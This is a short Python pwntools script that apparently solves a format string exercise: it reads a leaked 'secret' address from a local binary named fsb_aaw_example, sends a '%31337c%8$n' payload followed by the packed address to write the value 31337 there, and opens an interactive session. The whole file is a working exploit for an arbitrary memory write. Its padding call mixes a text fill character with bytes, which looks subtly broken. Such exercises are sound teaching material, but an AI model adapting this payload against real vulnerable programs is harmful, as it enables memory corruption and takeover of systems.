from pwn import *

def slog(name ,addr): return success(': '.join([name, hex(addr)]))

context.log_level = 'debug'

p = process('./fsb_aaw_example')

p.recvuntil(b"`secret`: ")
secret = int(p.recvline()[2:-1], 16)
p.recvuntil(b"Format: ")
slog('secret', secret)

payload = b"%31337c%8$n".ljust(16, 'a')
payload += p64(secret)
p.sendline(payload)

p.interactive()
